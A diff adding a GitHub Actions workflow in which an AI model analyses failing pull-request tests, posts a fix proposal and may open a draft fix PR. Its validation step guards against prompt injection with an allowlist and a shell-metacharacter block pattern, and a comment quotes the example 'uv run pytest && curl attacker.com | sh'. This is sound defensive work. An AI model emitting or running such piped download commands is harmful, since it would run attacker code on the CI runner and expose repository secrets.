@@ -1,0 +1,402 @@
+name: self-heal
+
+# Triggered when the Test workflow completes with a failure on a pull request.
+# Analyzes the failing tests and posts a fix proposal as a PR comment.
+#
+# Uses workflow_run (not pull_request) so secrets are available for fork PRs too —
+# workflow_run always runs in the context of the base repo, not the fork.
+#
+# Phase 1: comment-only. No auto-merge, no auto-push.
+# Phase 2 (gptme/gptme#2697): auto-open a draft fix PR when the structured gate passes.
+
+on:
+  workflow_run:
+    workflows: ["Test"]
+    types: [completed]
+
+permissions:
+  contents: read
+  pull-requests: write
+  actions: read
+
+jobs:
+  analyze:
+    name: Analyze failure and propose fix
+    # Only run when tests actually failed AND the trigger was a pull_request event.
+    if: |
+      github.event.workflow_run.conclusion == 'failure' &&
+      github.event.workflow_run.event == 'pull_request'
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    outputs:
+      autofix_eligible: ${{ steps.gate.outputs.eligible }}
+      pr_number: ${{ steps.pr.outputs.number }}
+      head_sha: ${{ steps.pr.outputs.head_sha }}
+
+    steps:
+      - name: Checkout base repo
+        uses: actions/checkout@v6
+        # No ref: defaults to base branch (master), not the fork's head SHA.
+        # This prevents a malicious fork from exfiltrating secrets by modifying
+        # scripts/github_ci_self_heal.py — we always run the trusted base copy.
+
+      - name: Get PR number
+        id: pr
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          # pull_requests[] is empty for fork PRs — look up by head SHA instead.
+          HEAD_SHA="${{ github.event.workflow_run.head_sha }}"
+          # Collect all matching PR numbers first, then take the first.
+          # Piping --paginate directly to head -1 triggers SIGPIPE and can abort
+          # the step under pipefail before GITHUB_OUTPUT is written.
+          PR_NUMBERS=$(gh api "repos/${{ github.repository }}/pulls?state=open&per_page=100" \
+            --paginate \
+            --jq ".[] | select(.head.sha == \"$HEAD_SHA\") | .number" \
+            2>/dev/null || true)
+          PR_NUMBER=$(echo "${PR_NUMBERS}" | head -1)
+          if [ -z "$PR_NUMBER" ]; then
+            echo "No open PR found for sha $HEAD_SHA — skipping"
+            echo "found=false" >> "$GITHUB_OUTPUT"
+            exit 0
+          fi
+          echo "found=true" >> "$GITHUB_OUTPUT"
+          echo "number=$PR_NUMBER" >> "$GITHUB_OUTPUT"
+          echo "head_sha=$HEAD_SHA" >> "$GITHUB_OUTPUT"
+          echo "PR: #$PR_NUMBER"
+
+      - name: Download failure log
+        if: steps.pr.outputs.found == 'true'
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          set -o pipefail
+          # workflow_run id is stable across reruns; pin to the triggering attempt
+          # so a newer rerun doesn't replace the failed logs we're analyzing.
+          gh run view ${{ github.event.workflow_run.id }} \
+            --repo ${{ github.repository }} \
+            --attempt ${{ github.event.workflow_run.run_attempt }} \
+            --log-failed 2>&1 | tail -c 15000 > /tmp/failure.log
+          echo "Failure log size: $(wc -c < /tmp/failure.log) bytes"
+
+      - name: Download PR diff
+        if: steps.pr.outputs.found == 'true'
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          gh pr diff ${{ steps.pr.outputs.number }} \
+            --repo ${{ github.repository }} 2>/dev/null \
+            | head -c 10000 > /tmp/pr.diff || true
+          echo "PR diff size: $(wc -c < /tmp/pr.diff) bytes"
+
+      - name: Fetch PR metadata
+        if: steps.pr.outputs.found == 'true'
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          gh pr view ${{ steps.pr.outputs.number }} \
+            --repo ${{ github.repository }} \
+            --json number,url,author,headRefName,headRefOid,headRepositoryOwner,headRepository \
+            > /tmp/pr-metadata.json
+          echo "PR metadata: $(wc -c < /tmp/pr-metadata.json) bytes"
+
+      - name: Set up Python
+        if: steps.pr.outputs.found == 'true'
+        uses: actions/setup-python@v6
+        with:
+          python-version: '3.12'
+
+      - name: Install dependencies
+        if: steps.pr.outputs.found == 'true'
+        run: pip install anthropic --quiet
+
+      - name: Analyze failure (structured)
+        id: analyze_structured
+        if: steps.pr.outputs.found == 'true'
+        env:
+          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
+        run: |
+          python3 scripts/github_ci_self_heal.py analyze /tmp/failure.log /tmp/pr.diff \
+            --json-out /tmp/analysis.json \
+            --markdown-out /tmp/analysis.md
+          echo "Structured analysis: $(wc -c < /tmp/analysis.json) bytes"
+
+      - name: Render legacy markdown (fallback)
+        id: analyze
+        if: steps.pr.outputs.found == 'true' && failure() && steps.analyze_structured.outcome == 'failure'
+        env:
+          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
+        run: |
+          python3 scripts/github_ci_self_heal.py /tmp/failure.log /tmp/pr.diff \
+            > /tmp/analysis.txt
+          echo "Legacy analysis: $(wc -c < /tmp/analysis.txt) bytes"
+
+      - name: Evaluate autofix gate
+        id: gate
+        if: steps.pr.outputs.found == 'true' && steps.analyze_structured.outcome == 'success'
+        run: |
+          python3 scripts/github_ci_self_heal.py gate /tmp/analysis.json /tmp/pr-metadata.json /tmp/pr.diff \
+            --repository ${{ github.repository }} \
+            --json-out /tmp/gate.json
+          ELIGIBLE=$(python3 -c "import json; print(str(json.load(open('/tmp/gate.json'))['eligible']).lower())" 2>/dev/null || echo "false")
+          echo "eligible=${ELIGIBLE}" >> "$GITHUB_OUTPUT"
+          echo "Gate result: eligible=${ELIGIBLE}"
+
+      - name: Upload artifacts
+        if: steps.pr.outputs.found == 'true' && success()
+        uses: actions/upload-artifact@v4
+        with:
+          name: self-heal-artifacts
+          path: |
+            /tmp/analysis.json
+            /tmp/analysis.md
+            /tmp/gate.json
+            /tmp/pr-metadata.json
+            /tmp/pr.diff
+          retention-days: 3
+          overwrite: true
+
+      - name: Post analysis as PR comment
+        id: post_comment
+        if: steps.pr.outputs.found == 'true' && success() && steps.analyze_structured.outcome == 'success'
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          FAILED_RUN_URL: ${{ github.event.workflow_run.html_url }}
+          BOT_RUN_URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
+          PR_NUMBER: ${{ steps.pr.outputs.number }}
+        run: |
+          ANALYSIS_CONTENT=$(cat /tmp/analysis.md 2>/dev/null || echo "")
+          if [ -z "$ANALYSIS_CONTENT" ]; then
+            echo "No structured analysis content — skipping comment"
+            exit 0
+          fi
+
+          # Dedup: skip if a self-heal comment already exists for this PR.
+          EXISTING=$(gh api "repos/${{ github.repository }}/issues/${PR_NUMBER}/comments" \
+            --paginate \
+            --jq '.[] | select(.body | contains("<!-- gptme-self-heal -->")) | .id' | wc -l)
+          if [ "${EXISTING:-0}" -gt "0" ]; then
+            echo "Self-heal comment already exists — skipping duplicate"
+            exit 0
+          fi
+
+          {
+            echo "<!-- gptme-self-heal -->"
+            echo "## 🔧 gptme-bot: Self-heal analysis"
+            echo ""
+            echo "Tests failed on this PR. Here's my analysis:"
+            echo ""
+            echo "${ANALYSIS_CONTENT}"
+            echo ""
+            echo "---"
+            echo "*[Failing run](${FAILED_RUN_URL}) · [Analysis run](${BOT_RUN_URL})*"
+          } > /tmp/comment.md
+
+          gh pr comment "${PR_NUMBER}" \
+            --repo ${{ github.repository }} \
+            --body-file /tmp/comment.md
+
+      - name: Post legacy analysis as PR comment
+        if: steps.pr.outputs.found == 'true' && failure() && steps.analyze.outcome == 'success' && steps.analyze_structured.outcome != 'success'
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          FAILED_RUN_URL: ${{ github.event.workflow_run.html_url }}
+          BOT_RUN_URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
+          PR_NUMBER: ${{ steps.pr.outputs.number }}
+        run: |
+          if [ ! -s /tmp/analysis.txt ]; then
+            echo "No analysis content — skipping comment"
+            exit 0
+          fi
+
+          EXISTING=$(gh api "repos/${{ github.repository }}/issues/${PR_NUMBER}/comments" \
+            --paginate \
+            --jq '.[] | select(.body | contains("<!-- gptme-self-heal -->")) | .id' | wc -l)
+          if [ "${EXISTING:-0}" -gt "0" ]; then
+            echo "Self-heal comment already exists — skipping duplicate"
+            exit 0
+          fi
+
+          {
+            echo "<!-- gptme-self-heal -->"
+            echo "## 🔧 gptme-bot: Self-heal analysis"
+            echo ""
+            echo "Tests failed on this PR. Here's my analysis:"
+            echo ""
+            cat /tmp/analysis.txt
+            echo ""
+            echo "---"
+            echo "*[Failing run](${FAILED_RUN_URL}) · [Analysis run](${BOT_RUN_URL})*"
+          } > /tmp/comment.md
+
+          gh pr comment "${PR_NUMBER}" \
+            --repo ${{ github.repository }} \
+            --body-file /tmp/comment.md
+
+      - name: Report error if analysis failed
+        if: steps.pr.outputs.found == 'true' && failure()
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          BOT_RUN_URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
+          PR_NUMBER: ${{ steps.pr.outputs.number }}
+        run: |
+          EXISTING=$(gh api "repos/${{ github.repository }}/issues/${PR_NUMBER}/comments" \
+            --paginate \
+            --jq '.[] | select(.body | contains("<!-- gptme-self-heal -->")) | .id' | wc -l)
+          if [ "${EXISTING:-0}" -gt "0" ]; then
+            echo "Self-heal comment already exists — skipping duplicate error comment"
+            exit 0
+          fi
+          {
+            echo "<!-- gptme-self-heal -->"
+            echo "## 🔧 gptme-bot: Self-heal (error)"
+            echo ""
+            echo "I attempted to analyze the CI failure but encountered an error."
+            echo "[Check the bot run](${BOT_RUN_URL}) for details."
+          } > /tmp/error-comment.md
+          gh pr comment "${PR_NUMBER}" \
+            --repo ${{ github.repository }} \
+            --body-file /tmp/error-comment.md
+
+  autofix:
+    name: Auto-fix draft PR
+    needs: [analyze]
+    if: |
+      always() &&
+      needs.analyze.outputs.autofix_eligible == 'true' &&
+      needs.analyze.result == 'success'
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    permissions:
+      contents: write
+      pull-requests: write
+      actions: read
+
+    steps:
+      - name: Checkout base repo
+        uses: actions/checkout@v6
+        with:
+          path: base
+
+      - name: Download artifacts
+        uses: actions/download-artifact@v4
+        with:
+          name: self-heal-artifacts
+          path: /tmp/artifacts
+
+      - name: Checkout PR head
+        uses: actions/checkout@v6
+        with:
+          ref: ${{ needs.analyze.outputs.head_sha }}
+          path: pr-head
+          persist-credentials: false
+
+      - name: Apply patch and validate
+        id: apply
+        env:
+          PR_NUMBER: ${{ needs.analyze.outputs.pr_number }}
+        run: |
+          set -eo pipefail
+
+          ANALYSIS_FILE=/tmp/artifacts/analysis.json
+          # Write patch directly from JSON to avoid shell variable mangling.
+          if ! python3 -c "import json,sys; p=json.load(open(sys.argv[1])).get('patch',''); sys.exit(1) if not p else open('/tmp/fix.patch','w').write(p)" "$ANALYSIS_FILE" 2>/dev/null; then
+            echo "No patch in analysis — aborting"
+            echo "applied=false" >> "$GITHUB_OUTPUT"
+            exit 0
+          fi
+          cd pr-head
+          if ! git apply --check /tmp/fix.patch 2>/dev/null; then
+            echo "Patch does not apply cleanly — aborting"
+            echo "applied=false" >> "$GITHUB_OUTPUT"
+            exit 0
+          fi
+          git apply --index /tmp/fix.patch
+          echo "applied=true" >> "$GITHUB_OUTPUT"
+
+          # Run validation commands
+          VALIDATION_COMMANDS=$(python3 -c "import json,sys;a=json.load(open(sys.argv[1]));[print(c) for c in a.get('validation_commands',[])]" "$ANALYSIS_FILE" 2>/dev/null || true)
+          PASSED=true
+          FAILED_CMDS=""
+          # Only run commands matching an explicit allowlist to prevent prompt-injection.
+          # python/python3 and uv run python*: restricted to -m MODULE form to block -c "..." injection.
+          # uv run is enumerated explicitly; bare "uv " is not sufficient since "uv run python3 -c ..." would pass.
+          # uv pip/sync/lock intentionally excluded: package install during validation is an injection vector.
+          ALLOWED_PATTERN="^(pytest|ruff|mypy|make) |^uv run (pytest|ruff|mypy|python3? +-m +[a-zA-Z0-9._])|^python3? +-m +[a-zA-Z0-9._]"
+          # Block shell metacharacters even on allowlisted prefixes to prevent injection like
+          # "uv run pytest && curl attacker.com | sh"
+          METACHAR_PATTERN='[;&|`><]|\$[({[]'
+          while IFS= read -r cmd; do
+            [ -z "$cmd" ] && continue
+            if ! echo "$cmd" | grep -qE "$ALLOWED_PATTERN"; then
+              echo "⚠️ Skipped (not in allowlist): $cmd"
+              PASSED=false
+              FAILED_CMDS="${FAILED_CMDS}${cmd}\n"
+              continue
+            fi
+            if echo "$cmd" | grep -qE "$METACHAR_PATTERN"; then
+              echo "⚠️ Skipped (contains shell metacharacters): $cmd"
+              PASSED=false
+              FAILED_CMDS="${FAILED_CMDS}${cmd}\n"
+              continue
+            fi
+            echo "Running validation: $cmd"
+            if bash -c "$cmd" 2>&1 | tail -5; then
+              echo "✅ $cmd passed"
+            else
+              echo "❌ $cmd failed"
+              PASSED=false
+              FAILED_CMDS="${FAILED_CMDS}${cmd}\n"
+            fi
+          done <<< "$VALIDATION_COMMANDS"
+          echo "validation_passed=${PASSED}" >> "$GITHUB_OUTPUT"
+
+      - name: Create draft PR
+        if: steps.apply.outputs.applied == 'true' && steps.apply.outputs.validation_passed == 'true'
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          PR_NUMBER: ${{ needs.analyze.outputs.pr_number }}
+          HEAD_REF: ${{ needs.analyze.outputs.head_sha }}
+        run: |
+          set -eo pipefail
+          cd pr-head
+          FIX_BRANCH="self-heal/pr-${PR_NUMBER}-run-${{ github.run_id }}"
+          git config user.name "gptme-bot"
+          git config user.email "bob@superuserlabs.org"
+          git checkout -b "$FIX_BRANCH"
+          git commit -a -m "fix: auto-fix for PR #${PR_NUMBER}" \
+            --author "gptme-bot <bob@superuserlabs.org>"
+
+          # Check for existing auto-fix PRs by source-pr marker
+          EXISTING=$(gh pr list \
+            --repo ${{ github.repository }} \
+            --state open \
+            --json number,body \
+            --jq ".[] | select(.body | contains(\"<!-- gptme-self-heal-autofix source-pr=${PR_NUMBER} -->\")) | .number" \
+            2>/dev/null || echo "")
+          if [ -n "$EXISTING" ]; then
+            echo "Auto-fix PR already exists for PR #${PR_NUMBER} (#${EXISTING}) — skipping"
+            exit 0
+          fi
+
+          # Render PR body (from base checkout)
+          python3 $GITHUB_WORKSPACE/base/scripts/github_ci_self_heal.py \
+            render-pr-body /tmp/artifacts/analysis.json /tmp/artifacts/gate.json \
+            --source-pr "${PR_NUMBER}" \
+            --failing-run-url "${{ github.event.workflow_run.html_url }}" \
+            --self-heal-run-url "${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}" \
+            --out /tmp/pr-body.md
+
+          # Push and open draft PR
+          git remote set-url origin "https://x-access-token:${GH_TOKEN}@github.com/${{ github.repository }}.git"
+          git push origin "HEAD:refs/heads/${FIX_BRANCH}"
+
+          gh pr create \
+            --repo ${{ github.repository }} \
+            --base "${{ github.event.workflow_run.head_branch }}" \
+            --head "$FIX_BRANCH" \
+            --draft \
+            --title "fix: auto-fix for PR #${PR_NUMBER}" \
+            --body-file /tmp/pr-body.md
+
+          echo "Created draft PR: $FIX_BRANCH"
